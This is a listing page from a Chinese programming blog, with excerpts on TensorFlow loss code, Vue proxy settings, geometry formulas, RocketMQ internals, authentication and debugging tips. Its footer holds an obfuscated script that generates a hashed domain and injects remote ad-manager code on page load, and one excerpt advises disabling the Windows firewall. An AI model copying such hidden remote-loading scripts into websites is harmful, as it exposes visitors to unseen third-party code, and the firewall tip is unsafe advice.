def smooth_l1_loss(bbox_pred, bbox_targets, bbox_inside_weights, bbox_outside_weights, sigma=1.0, dim=[1]): ''' bbox_pred ：预测框 bbox_targets：标签框 bbox_inside_weights： bbox_outside_weights： ''' sigma_2 = sigma ** 2 box_diff = bbox_pred - bbox_targets in_box_diff = bbox_inside_weights * box_diff abs_in_box_diff = tf.abs(in_box_diff) # tf.less 返回 True or False； a&lt;b,返回True， 否则返回False。 smoothL1_sign = tf.stop_gradient(tf.to_float(tf.less(abs_in_box_diff, 1. / sigma_2))) # 实现公式中的条件分支 in_loss_box = tf.pow(in_box_diff, 2) * (sigma_2 / 2.) * smoothL1_sign + (abs_in_box_diff - (0.5 / sigma_2)) * (1. - smoothL1_sign) out_loss_box = bbox_outside_weights * in_loss_box loss_box = tf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae0dc7c1965213c1b9682200628c62ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca318bf55b7bcadf13cdc99dbf90e831/" rel="bookmark">
			proxyTable的配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在dev环境下面：
proxyTable: { '/api': { target: 'http://api.douban.com/v2', //主域名，以前我都写192.168.2.57:80，这里跨域了 changeOrigin: true, //允许跨域 pathRewrite: { '^/api': '' } //重写路径，其实这里就是和上面的target拼接起来 } } 以前的老项目里是写成这样的：
proxyTable: { "/middleware": { target: "http://192.168.2.57:80", pathRewrite: { '^/middleware': '/patient/1116/guangji/middleware' //上下拼接，组成完整的请求路径 }, changeOrigin: true, } } 配合axios使用：
//在main.js中： Vue.prototype.HOST = '/api' //将api设置成全局属性，然后再给每个请求地址引用一下。 //这里必须这样写，我试了一下如果不在全局注册api的话，它还是会去请求192.168.2.57:8888下面的地址 //在代码里： this.axios.get(this.HOST + '/movie/in_theaters').then((response) =&gt; { console.log(response); }) //请求的接口是：http://api.douban.com/v2/movie/in_theaters 拼接起来的 注意：
1.这个方法只是讲了proxyTable应该怎样配置。
2.只能用在开发环境中，生产环境怎么用我还要再研究一下。
3.千万别忘了在main.js中引入api作为全局变量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7fd97e10b9daba4aa557c49281f8e0a/" rel="bookmark">
			求三点外接圆圆心公式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 作者：叶飞影
链接：https://www.zhihu.com/question/40422123/answer/86514178
来源：知乎
给定三角形三个顶点的坐标，如何求三角形的外心的坐标呢？
例如 ：给定a（x1,y1） b（x2,y2） c（x3,y3）求外接圆心坐标O（x，y）
1. 首先，外接圆的圆心是三角形三条边的垂直平分线的交点，我们根据圆心到顶点的距离相等，可以列出以下方程：
(x1-x)*(x1-x)+(y1-y)*(y1-y)=(x2-x)*(x2-x)+(y2-y)*(y2-y);
(x2-x)*(x2-x)+(y2-y)*(y2-y)=(x3-x)*(x3-x)+(y3-y)*(y3-y);
2.化简得到：
2*(x2-x1)*x+2*(y2-y1)y=x2^2+y2^2-x1^2-y1^2;
2*(x3-x2)*x+2*(y3-y2)y=x3^2+y3^2-x2^2-y2^2;
令:A1=2*(x2-x1)；
B1=2*(y2-y1)；
C1=x2^2+y2^2-x1^2-y1^2;
A2=2*(x3-x2)；
B2=2*(y3-y2)；
C2=x3^2+y3^2-x2^2-y2^2;
即:A1*x+B1y=C1;
A2*x+B2y=C2;
3.最后根据克拉默法则：
x=((C1*B2)-(C2*B1))/((A1*B2)-(A2*B1))；
y=((A1*C2)-(A2*C1))/((A1*B2)-(A2*B1))；
因此，x，y为最终结果；
---------------------------------------------------------------------------------------------------------------------------------
已知三点坐标，求外接圆圆心坐标与半径。 a=((y2-y1)*(y3*y3-y1*y1+x3*x3-x1*x1)-(y3-y1)*(y2*y2-y1*y1+x2*x2-x1*x1))/(2.0*((x3-x1)*(y2-y1)-(x2-x1)*(y3-y1))); b=((x2-x1)*(x3*x3-x1*x1+y3*y3-y1*y1)-(x3-x1)*(x2*x2-x1*x1+y2*y2-y1*y1))/(2.0*((y3-y1)*(x2-x1)-(y2-y1)*(x3-x1))); r^2=(x1-a)*(x1-a)+(y1-b)*(y1-b);（此处为r的平方） 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56e694a52a0c61568e309e8e185fbe5f/" rel="bookmark">
			RocketMQ 简介 -- Broker
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 RocketMQ Broker RocketMQ Broker 概述处理Producer消息处理Consumer消息内部服务 概述 Broker即是物理上的概念，也是逻辑上的概念。多个物理Broker通过IP:PORT区分，多个逻辑Broker通过BrokerName区分。多个逻辑Broker组成Cluster。Broker与Topic是多对多的关系。Broker自身包含一个使用10911端口的NettyServer、一个10909的NettyServer，以及一个NettyClient。HA通过10912端口提供服务，用于Broker内部各个部分的数据传输。Broker是最重要的部分，包括持久化消息、Broker集群一致性(HA)、保存历史消息、保存Consumer消费偏移量、索引创建等。Producer发送来的消息最终会通过CommitLog序列化到硬盘，执行序列化逻辑的类为AppendMessageCallback接口的实现类。Broker序列化消息是顺序写，序列化文件保存在userHome/store/commitlog目录下，文件名为总偏移量。默认为异步刷盘、提交日志单个文件1个G、单个consumer队列文件为不到6M 处理Producer消息 Broker通过SendMessageProcessor.processRequest()处理Producer生成的消息，处理过程如下：
反序列化消息头为SendMessageRequestHeader对象实例。构建消息上下文执行前置钩子程序处理message 判断当前系统时间是否在Broker配置的服务时间之后，只有条件成立broker才提供服务。判断当前Broker是否允许写入判断Topic是否为默认Topic检查Topic是否存在于此Broker，不存在则尝试创建Topic检查消息头中的queueId是否大于等于Topic允许的最大对列数。处理retry和死信消息(如果消息的Topic为重试Topic，且重试次数大于最大重试次数则将消息放入死信Topic中)根据Broker的配置和消息的TRAN_MSG属性判断是否处理事务消息将消息转化后的MessageExtBrokerInner对象序列化通过MessageStore序列化到硬盘(从Broker不允许序列化、不允许写的Broker不允许序列化、Topic长度不能大于127、Mssage属性的长度不能大于32767、页缓存不能在忙的状态–根据时间判断)通过CommitLog将消息序列化到硬盘 获取最新的MappedFile(因为是顺序写)后加锁获取MappedFile当前的写入位置从内存池(TransientStorePool)中获取内存，并将当前写入位置赋值到内存ByteBuffer中获取总偏移量(由于CommitLog下文件名是本文件起始位置在Broker提供服务后的偏移量位置，所以当前MappedFile的起始偏移量+文件写入偏移量为总偏移量)按照预定义格式将消息序列化到ByteBuffer中，具体序列化格式参见CommitLog.calMsgLength中的注释调用刷盘、HA逻辑，根据当前Broker的状态进行实际处理。将新的偏移量设置到MappedFile以上过程对TransactionMessage特殊处理，符合TRANSACTION_PREPARED_TYPE和TRANSACTION_ROLLBACK_TYPE类型的事务消息对Consumer不可见的逻辑，queueOffset为0。执行后置钩子程序 处理Consumer消息 Broker通过PullMessageProcessor.processRequest()处理Consumer生成的消息，处理过程如下：
判断当前Broker是否允许读根据消息头的ConsumerGroupName获取本地存储的Consumer订阅信息从ConsumeQueue中的MappedFileQueue根据偏移量获得MappedQueue获取消息从MappedQueue中根据偏移量获取消息返回 内部服务 Broker内部有各种服务用于实现特定的功能，简介如下：
IndexService，用于构建消息序列化文件的索引信息。将索引信息序列化到userName/store/index/当前时间文件中。AllocateMappedFileService，用于分配SubmitLog序列化使用的MappedFile。FlushConsumeQueueService，定时刷新ConsumeQueue到硬盘。TransientStorePool，类似于内存池，供各个MappedFile在序列化时借用内存处理。ScheduleMessageService，用于处理定时消息。ReputMessageService，重新分布消息同时会触发重新索引HAService，主、从Broker之间进行数据同步，只传输CommitLog序列化的消息。CleanCommitLogService，默认删除72小时之前过期的CommitLog序列化的消息。CleanConsumeQueueService，根据偏移量删除过期的ConsumeQueue，偏移量的值由最老的序列化消息文件决定。PullRequestHoldService，用于执行之前为未到数据且请求偏移量为0的PullRequest操作(即新注册的Consumer)，对于未找到数据的Pull操作不会返回给Consumer，而是待PullRequestHoldService本地代理请求。ClientHousekeepingService，扫描Producer、Consumer、FilterServer中超过120s未活动的NettyChannel，将不活动的Channel删除。FilterServerManager，此服务用于根据需要创建一到多个Java进程：FilterServer，FilterServer用于本地代理Consumer，过滤Broker的Message后给Consumer。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/697b19180c6720c68cbb392cfc52dd76/" rel="bookmark">
			4种认证（authentication）或授权（authorization）方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Authentication vs. authorization It is easy to confuse authentication with another element of the security plan: authorization. While authentication verifies the user’s identity, authorization verifies that the user in question has the correct permissions and rights to access the requested resource. As you can see, the two work together. Authentication occurs first, then authorization. authentication 认证访问者是谁 authorization 访问权限
authentication 一般包含两个步骤，第一步，用户需要安装服务提供的授权证书，或者用户需要使用API服务中已经存储的某个账户，也可以创建一个；第二步，每次发送请求到API服务时需要带上证书，因为RESTful API 是不会记录客户端与服务端的会话，无状态限制。
有些认证技术还涉注册，客户端需要安装证书，并且按需要安装用户个人的证书，客户端需要将客户端的证书和用户证书一起携带发送请求。
Basic Authentication HTTP Basic authentication is described in RFC 2617.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/697b19180c6720c68cbb392cfc52dd76/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89e5c86b4d19772b72e30c7cf0a77991/" rel="bookmark">
			如何用手机访问电脑本地 localhost 网页或者服务器, 以调试web项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近开始转向移动开发方向，因此对于一个移动开发的前端来说，使用各种真机来进行自己网站或者系统的界面进行针对性的调试就显的尤为重要了。因此，会经常通过电脑开启一个 wifi 来供手机进行连接，形成一个小的局域网，然后就通过局域网的 ip 地址（查询 ip 地址，cmd——》ipconfig）, 通过 ip 地址来进行自己本地服务器中的项目访问。本以为这种小 case 的东西可以分分钟搞定，可是，可是，可是偏偏就出现了无妨访问的情况。如下图所示： 看到这个就泪奔了，竟然直接访问不到本地服务器啊。对于这种情况有两种解决方案：
方案一：暴力解决（当然不是砸电脑，摔手机）。出现该问题主要是因为你电脑的防火墙将某些端口号的 htpp 的网络访问协议给屏蔽掉了（一般的电脑操作系统是默认不屏蔽 80,8080 一些常用的端口的），所以你可以直接将自己的电脑的防火墙全部关闭。然后就可以完美访问了。具体设置路径给一下（方便菜鸟使用）：控制面板 \ 所有控制面板项 \ Windows 防火墙 \ 自定义设置。
下面具体来讲解一下方案二：对于这种暴力方式还是很不友好的。为此，我们可以直接在防火墙中将 80 和 8080 端口设置为不屏蔽即可。具体操作如下，首先进入到 windows 防火墙面板，点击高级设置
进入到高级设置界面，分别在入站规则和出站规则中新建规则，选择端口，点击下一步，然后直接在对应的输入框中输入 80，然后默认点击下一步，完成。同样设置 8080 的这样一个规则。整个设置完成过后，手机就可以通过局域网来进行 ip 地址的访问了。
转自：https://blog.csdn.net/fly_home_ysc/article/details/49912621
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1dbd645628e4e7a4e325b334144004c6/" rel="bookmark">
			Spring Boot &#43; MongoDB实现作品或文章的三级评论
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用Spring Boot + MongoDB，做一个作品评论的功能，用户可以发表评论；其他用户可以对作品现有的评论进行回复；最顶级的评论者，可以对回复评论的人再回复评论。其中，评论的数据结构如下：
t_resource_comment { _id:, resource_id: 123, comment_user_id: "A", comment_user_name:, comment_content: "A的评论", ctime:, status:, comment_responses: [ { response_user_id: "B", response_user_name:, response_content:[ {ctime:, content:"B给A的第一个评论"}, {ctime:, content:"B给A的第二个评论"}, {ctime:, content:"B给A的第三个评论"} ] get_reply:[ {ctime:, content:"这是A给B的某一个评论的回复如果有就对应插入index对应的元素没有就是空串"}, {ctime:, content:"A没有回复B这一条就是空串"}, {ctime:, content:"A个神经病跳着回复了这一条评论，这数组的第三个元素就是A回复的内容"} ] }, { response_user_id: "C", response_user_name:, response_content:[ {ctime:, content:"C给A的第一个评论"}, {ctime:, content:"C给A的第二个评论"}, {ctime:, content:"C给A的第三个评论"} ] get_reply:[ {ctime:, content:"这是A给C的某一个评论的回复如果有就对应插入index对应的元素没有就是空串"}, {ctime:, content:"A没有回复C这一条就是空串"}, {ctime:, content:"A个神经病跳着回复了这一条评论，这数组的第三个元素就是A回复的内容"} ] }, ... ] } 比如，A对文章或作品123发表了一个评论；B看到发表的评论后，给A的评论回复了一个评论；A看到B的回复后，又对B的回复评论做了一个回复。一共三级。
创建一个Spring Boot项目，pom.xml如下：
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1dbd645628e4e7a4e325b334144004c6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84d593d6fba180e9eaa689436743e86c/" rel="bookmark">
			Parallels Desktop中Windows虚拟机卡死问题解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相信很多苹果电脑的友友对Parallels Desktop这个软件都十分熟悉。对于那些主力操作系统是OS X，但是有些工作不得不用到Windows的朋友来说， Parallels Desktop是最好的虚拟机软件之一，它安装虚拟系统简洁方便，融合模式下更是将微软与苹果两大公司操作系统的优势充分结合（前提是性能给力）。但是有些时候，它Parallels虚拟机也会出现卡死问题。当然，在我使用过程中，这种情况出现过多次，但是一旦出现，也会让我十分头疼。
当Parallels Desktop中的Windows 7卡死不动的时候，不管重启Parallels Desktop多少次，甚至重启电脑也无济于事。当然，防患于未然，你可以点击Parallels Desktop虚拟机名称下的小齿轮图标，把“窗口关闭时”的选项选为“强制关闭虚拟系统”，如下图：
但是，当Windows卡死在重新恢复（Resume）的时候，这一招就不灵啦，因为Parallels Desktop一定要你先重新打开Windows，然后才能更改这项设置。可是我要能进入Windows系统，我还设置个毛……
所以你应该这样：
1、打开活动监视器（Activity Monitor）, 就是这货：
2、然后找到卡住的Windows：
3、点击左上角“X”号把它关了，然后在Parallels Desktop里重新打开Windows 7，大功告成！
本文摘自: http://www.zhinin.com/mac_course-28.html
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/277/">«</a>
	<span class="pagination__item pagination__item--current">278/306</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/279/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>